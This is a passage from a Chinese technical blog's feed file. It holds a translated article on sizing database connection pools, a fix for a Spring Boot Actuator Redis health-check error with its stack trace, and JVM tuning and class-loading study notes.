href="https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AFTCP-BBR%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95">开启TCP BBR拥塞控制算法 · iMeiji/shadowsocks_install Wiki</a></li><li><a href="https://github.com/shadowsocks/shadowsocks/wiki/Optimizing-Shadowsocks">Optimizing Shadowsocks · shadowsocks/shadowsocks Wiki</a></li><li><a href="https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open">TCP Fast Open · shadowsocks/shadowsocks Wiki</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库连接池到底应该设多大？这篇文章可能会颠覆你的认知</title>
      <link href="/How%20many%20connections%20are%20appropriate/"/>
      <url>/How%20many%20connections%20are%20appropriate/</url>
      
        <content type="html"><![CDATA[<p>数据库连接池的配置是开发者们常常搞出坑的地方，在配置数据库连接池时，有几个可以说是和直觉背道而驰的原则需要明确。</p> <a id="more"></a><p>本文内容95%译自这篇文章：<a href="https://link.jianshu.com/?t=https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing">https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing</a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>数据库连接池大小往往是一个很容易被大家所忽略的参数，通常这个参数也和公司或者组内文化有关系，以前在美团的时候基本所有的项目连接池大小都设置20， 当时也没有考虑为什么会这么设置，反正就跟着大伙儿用。后来来到了猿辅导，发现大家使用的连接池是tomcat-jdbc，并没有针对连接池大小做特殊配置，使用的是默认的100。</p><p>在日常的时候无论设置成20，设置成100对于我们基本感觉不到有什么差别，但是前段时间对系统进行了打压，我们明显发现在一定压力下数据库的压力很大，于是我们对数据库连接池进行了调整，经过逐渐的减少连接池大小，以及等待时间，发现数据库连接池减少至20是一个比较合适的值。当然这个值并不适合所有业务，这一块需要经过各自业务的打压，根据信息统计出一个较为合适的值。当然有关数据库连接池的介绍可以看下面的文章。</p><h1 id="接下来是作者原正文"><a href="#接下来是作者原正文" class="headerlink" title="接下来是作者原正文"></a>接下来是作者原正文</h1><p>数据库连接池的配置是开发者们常常搞出坑的地方，在配置数据库连接池时，有几个可以说是和直觉背道而驰的原则需要明确。</p><h2 id="1万并发用户访问"><a href="#1万并发用户访问" class="headerlink" title="1万并发用户访问"></a>1万并发用户访问</h2><p>想象你有一个网站，压力虽然还没到Facebook那个级别，但也有个1万上下的并发访问——也就是说差不多2万左右的TPS。那么这个网站的数据库连接池应该设置成多大呢？结果可能会让你惊讶，因为这个问题的正确问法是：</p><p>“这个网站的数据库连接池应该设置成多小呢？”<br>下面这个视频是Oracle Real World Performance Group发布的，请先看完：<br><a href="http://www.dailymotion.com/video/x2s8uec">http://www.dailymotion.com/video/x2s8uec</a></p><p>（因为这视频是英文解说且没有字幕，我替大家做一下简单的概括：）<br>视频中对Oracle数据库进行压力测试，9600并发线程进行数据库操作，每两次访问数据库的操作之间sleep 550ms，一开始设置的中间件线程池大小为2048：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191120_1.png" alt="20191120_1"></p><p>初始化配置</p><p>压测跑起来之后是这个样子的：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191120084537.png" alt="20191120084537"></p><p>2048连接时的性能数据<br>每个请求要在连接池队列里等待33ms，获得连接后执行SQL需要77ms</p><p>此时数据库的等待事件是这个熊样的：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191120084611.png" alt="20191120084611"></p><p>各种buffer busy waits，数据库CPU在95%左右（这张图里没截到CPU）</p><p>接下来，把中间件连接池减到1024（并发什么的都不变），性能数据变成了这样：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191120084645.png" alt="20191120084645"></p><p>获取链接等待时长没怎么变，但是执行SQL的耗时减少了。<br>下面这张图，上半部分是wait，下半部分是吞吐量</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191120084705.png" alt="20191120084705"></p><p>能看到，中间件连接池从2048减半之后，吐吞量没变，但wait事件减少了一半。</p><p>接下来，把数据库连接池减到96，并发线程数仍然是9600不变。</p><p>96个连接时的性能数据<br>队列平均等待1ms，执行SQL平均耗时2ms。</p><p>image.png<br>wait事件几乎没了，吞吐量上升。</p><p>没有调整任何其他东西，仅仅只是缩小了中间件层的数据库连接池，就把请求响应时间从100ms左右缩短到了3ms。</p><h2 id="But-why"><a href="#But-why" class="headerlink" title="But why?"></a>But why?</h2><p>为什么nginx只用4个线程发挥出的性能就大大超越了100个进程的Apache HTTPD？回想一下计算机科学的基础知识，答案其实是很明显的。</p><p>即使是单核CPU的计算机也能“同时”运行数百个线程。但我们都[应该]知道这只不过是操作系统用时间分片玩的一个小把戏。一颗CPU核心同一时刻只能执行一个线程，然后操作系统切换上下文，核心开始执行另一个线程的代码，以此类推。给定一颗CPU核心，其顺序执行A和B永远比通过时间分片“同时”执行A和B要快，这是一条计算机科学的基本法则。一旦线程的数量超过了CPU核心的数量，再增加线程数系统就只会更慢，而不是更快。</p><p>这几乎就是真理了……</p><h1 id="有限的资源"><a href="#有限的资源" class="headerlink" title="有限的资源"></a>有限的资源</h1><p>上面的说法只能说是接近真理，但还并没有这么简单，有一些其他的因素需要加入。当我们寻找数据库的性能瓶颈时，总是可以将其归为三类：CPU、磁盘、网络。把内存加进来也没有错，但比起磁盘和网络，内存的带宽要高出好几个数量级，所以就先不加了。</p><p>如果我们无视磁盘和网络，那么结论就非常简单。在一个8核的服务器上，设定连接/线程数为8能够提供最优的性能，再增加连接数就会因上下文切换的损耗导致性能下降。数据库通常把数据存储在磁盘上，磁盘又通常是由一些旋转着的金属碟片和一个装在步进马达上的读写头组成的。读/写头同一时刻只能出现在一个地方，然后它必须“寻址”到另外一个位置来执行另一次读写操作。所以就有了寻址的耗时，此外还有旋回耗时，读写头需要等待碟片上的目标数据“旋转到位”才能进行操作。使用缓存当然是能够提升性能的，但上述原理仍然成立。</p><p>在这一时间段（即”I/O等待”）内，线程是在“阻塞”着等待磁盘，此时操作系统可以将那个空闲的CPU核心用于服务其他线程。所以，由于线程总是在I/O上阻塞，我们可以让线程/连接数比CPU核心多一些，这样能够在同样的时间内完成更多的工作。</p><p>那么应该多多少呢？这要取决于磁盘。较新型的SSD不需要寻址，也没有旋转的碟片。可别想当然地认为“SSD速度更快，所以我们应该增加线程数”，恰恰相反，无需寻址和没有旋回耗时意味着更少的阻塞，所以更少的线程[更接近于CPU核心数]会发挥出更高的性能。只有当阻塞创造了更多的执行机会时，更多的线程数才能发挥出更好的性能。</p><p>网络和磁盘类似。通过以太网接口读写数据时也会形成阻塞，10G带宽会比1G带宽的阻塞少一些，1G带宽又会比100M带宽的阻塞少一些。不过网络通常是放在第三位考虑的，有些人会在性能计算中忽略它们。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191120084732.png" alt="20191120084732"></p><p>上图是PostgreSQL的benchmark数据，可以看到TPS增长率从50个连接数开始变缓。在上面Oracle的视频中，他们把连接数从2048降到了96，实际上96都太高了，除非服务器有16或32颗核心。</p><h1 id="计算公式"><a href="#计算公式" class="headerlink" title="计算公式"></a>计算公式</h1><p>下面的公式是由PostgreSQL提供的，不过我们认为可以广泛地应用于大多数数据库产品。你应该模拟预期的访问量，并从这一公式开始测试你的应用，寻找最合适的连接数值。</p><p>连接数 = ((核心数 * 2) + 有效磁盘数)</p><p>核心数不应包含超线程(hyper thread)，即使打开了hyperthreading也是。如果活跃数据全部被缓存了，那么有效磁盘数是0，随着缓存命中率的下降，有效磁盘数逐渐趋近于实际的磁盘数。这一公式作用于SSD时的效果如何尚未有分析。</p><p>按这个公式，你的4核i7数据库服务器的连接池大小应该为((4 * 2) + 1) = 9。取个整就算是是10吧。是不是觉得太小了？跑个性能测试试一下，我们保证它能轻松搞定3000用户以6000TPS的速率并发执行简单查询的场景。如果连接池大小超过10，你会看到响应时长开始增加，TPS开始下降。</p><p>笔者注：<br>这一公式其实不仅适用于数据库连接池的计算，大部分涉及计算和I/O的程序，线程数的设置都可以参考这一公式。我之前在对一个使用Netty编写的消息收发服务进行压力测试时，最终测出的最佳线程数就刚好是CPU核心数的一倍。</p><h1 id="公理：你需要一个小连接池，和一个充满了等待连接的线程的队列"><a href="#公理：你需要一个小连接池，和一个充满了等待连接的线程的队列" class="headerlink" title="公理：你需要一个小连接池，和一个充满了等待连接的线程的队列"></a>公理：你需要一个小连接池，和一个充满了等待连接的线程的队列</h1><p>如果你有10000个并发用户，设置一个10000的连接池基本等于失了智。1000仍然很恐怖。即是100也太多了。你需要一个10来个连接的小连接池，然后让剩下的业务线程都在队列里等待。连接池中的连接数量应该等于你的数据库能够有效同时进行的查询任务数（通常不会高于2*CPU核心数）。</p><p>我们经常见到一些小规模的web应用，应付着大约十来个的并发用户，却使用着一个100连接数的连接池。这会对你的数据库造成极其不必要的负担。</p><h1 id="请注意"><a href="#请注意" class="headerlink" title="请注意"></a>请注意</h1><p>连接池的大小最终与系统特性相关。</p><p>比如一个混合了长事务和短事务的系统，通常是任何连接池都难以进行调优的。最好的办法是创建两个连接池，一个服务于长事务，一个服务于短事务。</p><p>再例如一个系统执行一个任务队列，只允许一定数量的任务同时执行，此时并发任务数应该去适应连接池连接数，而不是反过来。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>在实际业务场景中，最佳的链接池数量大小最佳通常可能不能简单使用计算公式，首先是我们数据库不是只为某台机器提供链接，他会为多台机器，多个服务同时提供，所以通过核心数计算可能不是一个很好的方法。最佳的连接池还是需要通过不断压测来得到最佳的大小。当然这里需要注意的是，如果你以前使用了很大的链接池，并且使用了大事务(事务里面有I/O操作)，再你减小了链接池大小之后，你需要特别当心，很有可能会触发链接池不足的异常，所以再优化之前需要干掉你的大事务。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redissionq启动报错涉及安全检查问题排查</title>
      <link href="/redission%E5%90%AF%E5%8A%A8%E6%B6%89%E5%8F%8Aspringcloud%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E6%8A%A5%E9%94%99/"/>
      <url>/redission%E5%90%AF%E5%8A%A8%E6%B6%89%E5%8F%8Aspringcloud%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p>[size=medium]初涉spring boot/cloud，最近有个项目启动时报redis无法连接，但又不影响正常使用<br>检查日志发现有如下报错信息：[/size]</p><pre><code>at org.springframework.boot.actuate.health.RedisHealthIndicator.doHealthCheck(RedisHealthIndicator.java:52)at org.springframework.boot.actuate.health.AbstractHealthIndicator.health(AbstractHealthIndicator.java:43)at org.springframework.boot.actuate.health.CompositeHealthIndicator.health(CompositeHealthIndicator.java:68)at org.springframework.boot.actuate.endpoint.HealthEndpoint.invoke(HealthEndpoint.java:85)</code></pre><p>[size=medium]项目中没有明确指定Actuator监控Redis，因此怀疑是Actuator发现项目有redis时，默认自动监控的。</p><p>有两个解决方案：<br>第一种：允许Actuator监控Redis连接<br>在application.yml中增加配置：[/size]</p><p>spring:<br>  redis:<br>    database: 0<br>    host: 127.0.0.1<br>    port: 6379<br>    password:<br>    timeout: 0<br>    pool:<br>      max-active: 8<br>      max-wait: -1<br>      max-idle: 8<br>      min-idle: 0</p><p>[size=medium]第二种：禁止Actuator监控Redis连接<br>在application.yml中增加配置：[/size]</p><p>management:<br>  health:<br>    redis:<br>      enabled: false</p><p>[size=medium]完整的报错信息如下：[/size]</p><p>org.springframework.data.redis.RedisConnectionFailureException: Cannot get Jedis connection; nested exception is redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool<br>    at org.springframework.data.redis.connection.jedis.JedisConnectionFactory.fetchJedisConnector(JedisConnectionFactory.java:204)<br>    at org.springframework.data.redis.connection.jedis.JedisConnectionFactory.getConnection(JedisConnectionFactory.java:348)<br>    at org.springframework.data.redis.core.RedisConnectionUtils.doGetConnection(RedisConnectionUtils.java:129)<br>    at org.springframework.data.redis.core.RedisConnectionUtils.getConnection(RedisConnectionUtils.java:92)<br>    at org.springframework.data.redis.core.RedisConnectionUtils.getConnection(RedisConnectionUtils.java:79)<br>    at org.springframework.boot.actuate.health.RedisHealthIndicator.doHealthCheck(RedisHealthIndicator.java:52)<br>    at org.springframework.boot.actuate.health.AbstractHealthIndicator.health(AbstractHealthIndicator.java:43)<br>    at org.springframework.boot.actuate.health.CompositeHealthIndicator.health(CompositeHealthIndicator.java:68)<br>    at org.springframework.boot.actuate.endpoint.HealthEndpoint.invoke(HealthEndpoint.java:85)<br>    at org.springframework.boot.actuate.endpoint.HealthEndpoint.invoke(HealthEndpoint.java:35)<br>    at org.springframework.boot.actuate.endpoint.jmx.DataEndpointMBean.getData(DataEndpointMBean.java:46)<br>    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)<br>    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)<br>    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br>    at java.lang.reflect.Method.invoke(Method.java:498)<br>    at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:71)<br>    at sun.reflect.GeneratedMethodAccessor186.invoke(Unknown Source)<br>    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br>    at java.lang.reflect.Method.invoke(Method.java:498)<br>    at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:275)<br>    at javax.management.modelmbean.RequiredModelMBean$4.run(RequiredModelMBean.java:1252)<br>    at java.security.AccessController.doPrivileged(Native Method)<br>    at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:80)<br>    at javax.management.modelmbean.RequiredModelMBean.invokeMethod(RequiredModelMBean.java:1246)<br>    at javax.management.modelmbean.RequiredModelMBean.invoke(RequiredModelMBean.java:1085)<br>    at org.springframework.jmx.export.SpringModelMBean.invoke(SpringModelMBean.java:90)<br>    at javax.management.modelmbean.RequiredModelMBean.getAttribute(RequiredModelMBean.java:1562)<br>    at org.springframework.jmx.export.SpringModelMBean.getAttribute(SpringModelMBean.java:109)<br>    at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:647)<br>    at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:678)<br>    at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1445)<br>    at javax.management.remote.rmi.RMIConnectionImpl.access$300(RMIConnectionImpl.java:76)<br>    at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1309)<br>    at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1401)<br>    at javax.management.remote.rmi.RMIConnectionImpl.getAttribute(RMIConnectionImpl.java:639)<br>    at sun.reflect.GeneratedMethodAccessor85.invoke(Unknown Source)<br>    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br>    at java.lang.reflect.Method.invoke(Method.java:498)<br>    at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)<br>    at sun.rmi.transport.Transport$1.run(Transport.java:200)<br>    at sun.rmi.transport.Transport$1.run(Transport.java:197)<br>    at java.security.AccessController.doPrivileged(Native Method)<br>    at sun.rmi.transport.Transport.serviceCall(Transport.java:196)<br>    at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)<br>    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)<br>    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683)<br>    at java.security.AccessController.doPrivileged(Native Method)<br>    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)<br>    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)<br>    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)<br>    at java.lang.Thread.run(Thread.java:748)<br>Caused by: redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool<br>    at redis.clients.util.Pool.getResource(Pool.java:53)<br>    at redis.clients.jedis.JedisPool.getResource(JedisPool.java:226)<br>    at redis.clients.jedis.JedisPool.getResource(JedisPool.java:16)<br>    at org.springframework.data.redis.connection.jedis.JedisConnectionFactory.fetchJedisConnector(JedisConnectionFactory.java:194)<br>    … 50 common frames omitted<br>Caused by: redis.clients.jedis.exceptions.JedisConnectionException: java.net.ConnectException: Connection refused: connect<br>    at redis.clients.jedis.Connection.connect(Connection.java:207)<br>    at redis.clients.jedis.BinaryClient.connect(BinaryClient.java:93)<br>    at redis.clients.jedis.BinaryJedis.connect(BinaryJedis.java:1767)<br>    at redis.clients.jedis.JedisFactory.makeObject(JedisFactory.java:106)<br>    at org.apache.commons.pool2.impl.GenericObjectPool.create(GenericObjectPool.java:888)<br>    at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:432)<br>    at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:361)<br>    at redis.clients.util.Pool.getResource(Pool.java:49)<br>    … 53 common frames omitted<br>Caused by: java.net.ConnectException: Connection refused: connect<br>    at java.net.DualStackPlainSocketImpl.waitForConnect(Native Method)<br>    at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:85)<br>    at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)<br>    at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)<br>    at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)<br>    at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:172)<br>    at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)<br>    at java.net.Socket.connect(Socket.java:589)<br>    at redis.clients.jedis.Connection.connect(Connection.java:184)<br>    … 60 common frames omitte</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SimpleTuning</title>
      <link href="/SimpleTuning/"/>
      <url>/SimpleTuning/</url>
      
        <content type="html"><![CDATA[<p>Simple JVM  Tuning simulation,一些怪异的面试题，深入java虚拟机部分笔记以及书本部分资料摘抄。</p><a id="more"></a><p>[TOC]</p><h1 id="SimpleTuning"><a href="#SimpleTuning" class="headerlink" title="SimpleTuning"></a>SimpleTuning</h1><p>Simple JVM  Tuning simulation</p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><blockquote><ul><li>设置参数 有一点需要注意的是，如果-Xms和-Xmx没有被设定成相同的值，而且-Xmn被使用了，当调整Java堆的大小的时候，</li><li>vm_1 : 默认：-Xms:默认为物理内存的1/64 -Xmx:默认为物理内存的1/4或者1G,<br>因为存在堆空间扩容，第一次运行的时候会执行多次FULL GC,通过关闭自适应调整策略(-XX:-UseAdaptiveSizePolicy)，<br>JVM已经事先被禁止动态调整内存池的大小。</li><li>-XX:+PrintGCDetails</li><li>-XX:+UseG1GC -XX:+UseConcMarkSweepGC -XX:+UseParallelGC -XX:+UseSerialGC  除了使用G1算法外，其他的算法实际返回用户可视化的可用空间都将少一个Survivor区的大小的空间<br>-XX:+PrintGCApplicationStoppedTime -XX:+PrintGCApplicationConcurrentTime 获取完整的安全点日志<br>   -Djava.util.concurrent.ForkJoinPool.common.parallelism=核数*2    IO操作时会有很多CPU处在闲置，使用默认线程池个数(机器核数)这样可能会丢失7%的性能，此参数修改ForkJoin的线程池个数，</li></ul></blockquote><blockquote><ul><li>vm_1 : 默认：-Xms:默认为物理内存的1/64 -Xmx:默认为物理内存的1/4或者1G</li><li>vm_2 : -Xms750m -Xms2048m -Xmx2048m</li><li>vm_3 : -Xms1024m -Xms2048m -Xmx2048m</li><li>vm_4 : -Xms1024m -Xms3096m -Xmx3096m</li><li>vm_5 : -Xms250m -Xms1024m -Xmx1024m</li></ul></blockquote><h1 id="记录书籍例子以及怪异的面试题"><a href="#记录书籍例子以及怪异的面试题" class="headerlink" title="记录书籍例子以及怪异的面试题"></a>记录书籍例子以及怪异的面试题</h1><p>  <strong><font color=red>部分例子的代码见：<a href="https://github.com/yccjack/SimpleTuning">jvm_SimpleTuning_github_mysticalycc</a></font></strong></p><h2 id="Integer类"><a href="#Integer类" class="headerlink" title="Integer类"></a>Integer类</h2><p>  [x] Integer类Cache，以及反射修改导致的问题.</p><pre><code>@ jdkcode.IntegerCode</code></pre><hr><h2 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h2><p>  <strong><font color=red>以下整理自 &lt;&lt;深入理解 JAVA虚拟机&gt;&gt;</font></strong></p><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a><strong>加载</strong></h3><blockquote><p>“加载”(Loading)阶段是“类加载”(Class Loading)过程的第一个阶段，在此阶段，虚拟机需要完成以下三件事情：</p></blockquote><pre><code> 1、 通过一个类的全限定名来获取定义此类的二进制字节流。 2、 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。 3、 在Java堆中生成一个代表这个类的java.lang.Class对象，作为方法区这些数据的访问入口。</code></pre><p>   加载阶段即可以使用系统提供的类加载器在完成，也可以由用户自定义的类加载器来完成。加载阶段与连接阶段的部分内容(如一部分字节码文件格式验证动作)是交叉进行的，加载阶段尚未完成，连接阶段可能已经开始。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a><strong>验证</strong></h3><ul><li>x1: 文件格式验证<blockquote><ul><li>是否以魔数0xCAFEBABE开头。</li><li>主次版本是否在当前虚拟机处理范围之内。</li><li>常量池常量是否有不被支持的类型 (检查常量tag标志)</li><li>指向常量的各种索引值重是否有指向不存在的常量或者不符合类型的常量</li><li>CONSTANT_Utf8_info型的常量中是否有不符合UTF8编码的数据。</li><li>……</li></ul></blockquote><ul><li>x2: 元数据验证<blockquote><ul><li>这个类是否有父类 (除了java.lang.Object之外，所有类都应该有父类)</li><li>…..</li></ul></blockquote></li></ul></li></ul><ul><li><p>x3: 字节码验证</p><blockquote><ul><li>保证任意时刻操作数栈的数据类型与指令代码序列都能配合工作，例如不会出现在操作栈放置了int类型，使用时却按long类型加载本地变量</li><li>保证跳转指令不会跳转到方法体以外的字节码指令上。</li><li>保证方法体中的类型转换是有效的。</li></ul></blockquote><ul><li>x4: 符号引用验证：<blockquote><ul><li>符号引用验证的目的是确保解析动作能正常执行，如果无法通过验证，则会抛出java.lang.IncompatibleClassChangeError异常的子类, 如java.lang.IllegalAccessError，java.lang.NoSuchFieldError,java.lang.NoSuchMethodError等<br>符号引用非必须，所以在编译器反复验证过的情况下，可以使用 -Xverify:none来关闭以增加类加载的速度。</li></ul></blockquote></li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a><strong>准备</strong></h3><blockquote><p>*准备阶段是正式分配内存并设置类变量初始值的阶段，这些变量将在方法区分配。</p><ul><li>此阶段只会对类变量进行内存分配，只对类变量进行设置默认值，类中赋予的值putstatic指令是程序编译后，<br>存放在类构造器&lt;clinit&gt;()方法之中，赋值动作将在初始化阶段才会执行。<br>见例子：classload.LoadClassInit</li></ul></blockquote></li></ul><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a><strong>解析</strong></h3><p>解析阶段是将常量池中的符号引用替换为直接引用的过程。**在进行解析之前需要对符号引用进行解析，不同虚拟机实现可以根据需要判断到底是在类被加载器加载的时候对常量池的符号引用进行解析（也就是初始化之前），还是等到一个符号引用被使用之前进行解析（也就是在初始化之后）。</p><p>到现在我们已经明白解析阶段的时机，那么还有一个问题是：如果一个符号引用进行多次解析请求，虚拟机中除了invokedynamic指令外，虚拟机可以对第一次解析的结果进行缓存（在运行时常量池中记录引用，并把常量标识为一解析状态），这样就避免了一个符号引用的多次解析。</p><p>解析动作主要针对的是类或者接口、字段、类方法、方法类型、方法句柄和调用点限定符7类符号引用。这里主要说明前四种的解析过程。</p><p><strong>类或者接口解析</strong></p><p>要把一个类或者接口的符号引用解析为直接引用，需要以下三个步骤：</p><blockquote><ol><li>如果该符号引用不是一个数组类型，那么虚拟机将会把该符号代表的全限定名称传递给类加载器去加载这个类。这个过程由于涉及验证过程所以可能会触发其他相关类的加载</li><li>如果该符号引用是一个数组类型，并且该数组的元素类型是对象。我们知道符号引用是存在方法区的常量池中的，该符号引用的描述符会类似”[java/lang/Integer”的形式，将会按照上面的规则进行加载数组元素类型，如果描述符如前面假设的形式，需要加载的元素类型就是java.lang.Integer ,接着由虚拟机将会生成一个代表此数组对象的直接引用</li><li>如果上面的步骤都没有出现异常，那么该符号引用已经在虚拟机中产生了一个直接引用，但是在解析完成之前需要对符号引用进行验证，主要是确认当前调用这个符号引用的类是否具有访问权限，如果没有访问权限将抛出java.lang.IllegalAccess异常</li></ol></blockquote><p><strong>字段解析</strong></p><p>对字段的解析需要首先对其所属的类进行解析，因为字段是属于类的，只有在正确解析得到其类的正确的直接引用才能继续对字段的解析。对字段的解析主要包括以下几个步骤：</p><blockquote><ol><li>如果该字段符号引用就包含了简单名称和字段描述符都与目标相匹配的字段，则返回这个字段的直接引用，解析结束</li><li>否则，如果在该符号的类实现了接口，将会按照继承关系从下往上递归搜索各个接口和它的父接口，如果在接口中包含了简单名称和字段描述符都与目标相匹配的字段，那么久直接返回这个字段的直接引用，解析结束  </li><li>否则，如果该符号所在的类不是Object类的话，将会按照继承关系从下往上递归搜索其父类，如果在父类中包含了简单名称和字段描述符都相匹配的字段，那么直接返回这个字段的直接引用，解析结束</li><li>否则，解析失败，抛出java.lang.NoSuchFieldError异常</li><li><strong><em>见例子：classload.FileResolution</em></strong></li></ol></blockquote><p>如果最终返回了这个字段的直接引用，就进行权限验证，如果发现不具备对字段的访问权限，将抛出java.lang.IllegalAccessError异常</p><p><strong>类方法解析</strong></p><p>进行类方法的解析仍然需要先解析此类方法的类，在正确解析之后需要进行如下的步骤：</p><blockquote><ol><li><p>类方法和接口方法的符号引用是分开的，所以如果在类方法表中发现class_index（类中方法的符号引用）的索引是一个接口，那么会抛出java.lang.IncompatibleClassChangeError的异常</p></li><li><p>如果class_index的索引确实是一个类，那么在该类中查找是否有简单名称和描述符都与目标字段相匹配的方法，如果有的话就返回这个方法的直接引用，查找结束</p></li><li><p>否则，在该类的父类中递归查找是否具有简单名称和描述符都与目标字段相匹配的字段，如果有，则直接返回这个字段的直接引用，查找结束</p><ol start="4"><li>否则，在这个类的接口以及它的父接口中递归查找，如果找到的话就说明这个方法是一个抽象类，查找结束，返回java.lang.AbstractMethodError异常</li></ol></li><li><p>否则，查找失败，抛出java.lang.NoSuchMethodError异常</p></li></ol></blockquote><p>如果最终返回了直接引用，还需要对该符号引用进行权限验证，如果没有访问权限，就抛出java.lang.IllegalAccessError异常</p><p><strong>接口方法解析</strong></p><p>同类方法解析一样，也需要先解析出该方法的类或者接口的符号引用，如果解析成功，就进行下面的解析工作：</p><blockquote><ol><li><p>如果在接口方法表中发现class_index的索引是一个类而不是一个接口，那么也会抛出java.lang.IncompatibleClassChangeError的异常</p></li><li><p>否则，在该接口方法的所属的接口中查找是否具有简单名称和描述符都与目标字段相匹配的方法，如果有的话就直接返回这个方法的直接引用。</p></li><li><p>否则，在该接口以及其父接口中查找，直到Object类，如果找到则直接返回这个方法的直接引用</p></li><li><p>否则，查找失败</p></li></ol></blockquote><p>接口的所有方法都是public，所以不存在访问权限问题。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>初始化阶段是类加载过程的最后一步，这个阶段才开始真正的执行用户定义的Java程序。在准备阶段，变量已经赋过一次系统要求的初始值，而在初始化阶段，则需要为类变量(非final修饰的类变量)和其他变量赋值，其实就是执行类的<clinit>()方法。在Java语言体系中，<clinit>()是由编译器生成的，编译器在编译阶段会自动收集类中的所有类变量的赋值动作和静态语句块(static{})中的语句合并而成的，编译器收集的顺序是由语句的顺序决定的，静态语句块只能访问到定义在静态语句块之前的变量，定义在静态语句块之后的变量，可以赋值，但是不能访问。</p><p>&lt;clinit&gt;()方法与类的构造方法不同，它不需要用户显示的调用，虚拟机会保证父类的&lt;clinit&gt;()方法先于子类的&lt;clinit&gt;()执行，java.lang.Object的<clinit>()方法是最先执行的。接口中不能使用用静态语句块，所以接口的<clinit>()只包含类变量，所以接口的<clinit>()方法执行时，不要求限制性父接口的<clinit>()方法。<clinit>()方法对于类和接口来说不是必须的，如果类或接口中没有定义类变量，也没有静态语句块，那么编译器将不为这个类或者接口生成<clinit>()方法，如果类或者接口中生成了<clinit>()方法，那么这个方法在执行过程中，虚拟机会保证在多线程环境下的线程安全问题。</p><p>　　